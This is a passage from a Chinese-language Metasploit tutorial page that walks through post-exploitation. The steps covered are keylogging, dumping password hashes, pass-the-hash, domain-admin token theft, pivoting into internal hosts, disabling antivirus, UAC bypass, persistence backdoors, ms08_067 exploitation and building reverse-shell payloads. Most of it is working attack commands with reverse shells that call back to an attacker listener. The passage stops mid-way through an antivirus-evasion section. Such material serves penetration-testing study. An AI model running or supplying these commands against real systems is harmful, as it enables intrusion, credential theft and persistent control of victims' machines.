class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; ps  #查看目标机器进程，假设发现explorer.exe的进程号为1668:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; migrate 1668  #插入该进程</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run post/windows/capture/keylog_recorder  #运行键盘记录模块，将击键记录保存到本地txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cat /root/.msf3/loot/*****.txt  #查看结果</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>获取系统账号密码：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run post/windows/gather/hashdump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>当获取到密码的hash之后无法破解出明文密码且无法直接使用hash登陆，需要使用pass-the-hash技术：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/smb/psexec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PAYLOAD windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOST 192.168.1.130</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set SMBPass aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>获取到系统权限后我们可以新建一个普通账号，然后使用此账号执行我们的后门：</p><p>在目标机器上执行：<code>net uaer hacker pass /add</code></p><p>本地生成一个后门程序：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LHOST=192.168.1.111 LPORT=443 X &gt;payload.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>将payload.exe拷贝到目标机器然后使用新建立的账号执行,本地执行端口监听，等待来自目标机器连接：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LHOST=192.168.1.111 LPORT=443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">getsystem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">getuid</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>至此取得SYSTEM权限</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2令牌模拟">2、令牌模拟：<a class="hash-link" href="#2令牌模拟" title="标题的直接链接">​</a></h3><p>当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; ps  # 查看目标机器进程，找出域控账户运行的进程ID，假如发现PID为380</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; steal_token 380</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#有时ps命令列出的进程中可能不存在域控账户的进程，此时使用incognito模块查看可用token：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use incognito</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; list_tokens –u  #列出可用token，假如找到域控token</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; impersonate_token SNEAKS.IN\\ihazdomainadmin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; add_user hacker password –h 192.168.1.50 #在域控主机上添加账户</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; add_group_user “Domain Admins” hacker –h 192.168.1.50  #将账户添加至域管理员组</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="3内网渗透">3、内网渗透：<a class="hash-link" href="#3内网渗透" title="标题的直接链接">​</a></h3><p>当取得同网段内一台主机的权限后可以进一步渗透网内其他主机：</p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run get_local_subnets  #查看网段/子网</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Local subnet: 192.168.33.0/255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; background  #转入后台运行</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; route add 192.168.33.0 255.255.255.0 1  #本地添加路由信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; route print #查看添加的信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use linux/samba/lsa_transnames_heap   #准备向内网目标主机进攻</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload linux/x86/shell/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 10.10.1.129 #此处为attacking主机的外网IP </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 8080</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOST 192.168.33.132 #内网目标主机</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>也可以使用自动式添加路由模块：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; load auto_add_route</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="4meterpreter脚本">4、Meterpreter脚本：<a class="hash-link" href="#4meterpreter脚本" title="标题的直接链接">​</a></h3><p>使用run scriptname 方式执行</p><p>vnc脚本,获取远程机器vnc界面控制</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run vnc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run screen_unlock</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>进程迁移</p><p>当攻击成功后将连接进程从不稳定进程（如使用浏览器溢出漏洞exp进行攻击时浏览器可能会被目标关闭）迁移至稳定进程(explorer.exe)，保持可连接。</p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run post/windows/manage/migrate</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>（在64位win7中migrate需要管理员权限执行后门才能成功，而migrate前后获取的权限是有差异的。）</p><p>关闭杀毒软件</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run killav   （这个脚本要小心使用，可能导致目标机器蓝屏死机。）</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>获取系统密码hash</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run hashdump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>（64位win7下需要管理员权限执行后门且先getsystem，然后使用</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">run  post/windows/gather/hashdump来dump hash成功率更高。</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>而且如果要使用shell添加系统账户的话win7下得先：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">run post/windows/escalate/bypassuac  ，不然可能不会成功。）</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>获取系统流量数据</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run packtrecorder –i 1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>直捣黄龙</p><p>可以干很多事情：获取密码，下载注册表，获取系统信息等</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run scraper</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>持久保持</p><p>当目标机器重启之后仍然可以控制</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run persistence –X –i 50 –p 443 –r 192.168.1.111</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>-X 开机启动  -i连接超时时间 –p端口 –rIP</p><p>下次连接时：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPOST 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>(会在以下位置和注册表以随机文件名写入文件等信息，如：</p><p>C:\Users\YourtUserName\AppData\Local\Temp\MXIxVNCy.vbs</p><p>C:\Users\YourtUserName\AppData\Local\Temp\radF871B.tmp\svchost.exe</p><p>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DjMzwzCDaoIcgNP)</p><p>POST整合模块</p><p>可实现同时多个session操作</p><p>例子：获取hash</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run post/windows/gather/hashdump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>其他还有很多，使用TAB键补全看下就知道</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="5升级command-shell">5、升级command shell<a class="hash-link" href="#5升级command-shell" title="标题的直接链接">​</a></h3><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; search ms08_067</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/smb/ms08_067_netapi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PAYLOAD windows/shell/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set TARGET 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">setg LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">setg LPORT 8080</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit –z  #后台运行，如果此处未使用-z参数，后面可以按CTRL-Z转到后台</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sessions –u 1  #升级shell，必须前面使用setg设定</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sessions –i 2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="6使用railgun操作windows-apis">6、使用Railgun操作windows APIs<a class="hash-link" href="#6使用railgun操作windows-apis" title="标题的直接链接">​</a></h3><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; irb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;&gt;client.railgun.user32.MessageBoxA(o,”hello”,”world”,”MB_OK”)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>在目标机器上会弹出一个标题栏为world和内容为hello的窗口</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="七避开杀软">七．避开杀软<a class="hash-link" href="#七避开杀软" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="1使用msfpayload创建可执行后门">1、使用msfpayload创建可执行后门：<a class="hash-link" href="#1使用msfpayload创建可执行后门" title="标题的直接链接">​</a></h3><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/shell_reverse_tcp 0  #查看选项</span><br></span><span class="token-line" 